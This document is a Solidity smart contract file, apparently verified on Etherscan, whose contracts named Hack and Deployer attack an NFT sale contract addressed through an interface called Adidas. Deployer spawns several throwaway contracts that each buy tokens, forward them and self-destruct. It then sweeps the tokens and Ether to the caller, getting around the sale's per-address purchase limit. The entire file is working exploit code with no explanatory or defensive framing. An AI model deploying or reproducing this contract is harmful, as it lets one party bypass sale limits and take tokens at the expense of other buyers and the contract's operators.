/**
 *Submitted for verification at Etherscan.io on 2021-12-19
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Adidas{
    function purchase(uint256 amount) external payable;
    function safeTransferFrom(
        address from,
        address to,
        uint256 id,
        uint256 amount,
        bytes calldata data
    ) external;
    function balanceOf(address account, uint256 id) external view returns (uint256);
}

contract Hack{
    constructor(address _addr) payable{
        Adidas target = Adidas(_addr);
        target.purchase{value: 0.4 ether}(2);
        target.safeTransferFrom(address(this), msg.sender, 0, 2, bytes("Hacking"));
        address payable add = payable(address(this));
        selfdestruct(add);
    }

    function onERC1155Received(address, address, uint256, uint256, bytes memory) public pure returns (bytes4) {
        return this.onERC1155Received.selector;
    }  
}

contract Deployer{
    function execute(address _addr) payable external returns(bytes memory){
      Adidas target = Adidas(_addr);  
      for (uint256 i = 0; i < 3; i++) {
        new Hack{value: 0.4 ether}(_addr);
     }
     address payable add = payable(address(msg.sender));
     target.safeTransferFrom(address(this), msg.sender, 0, target.balanceOf(address(this), 0), bytes("Hacking"));
     (bool sent, bytes memory data) = add.call{value: getBalance()}("");
        require(sent, "Failed to send Ether");
      return data;
     //selfdestruct(add);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function onERC1155Received(address, address, uint256, uint256, bytes memory) public pure returns (bytes4) {
        return this.onERC1155Received.selector;
    } 
}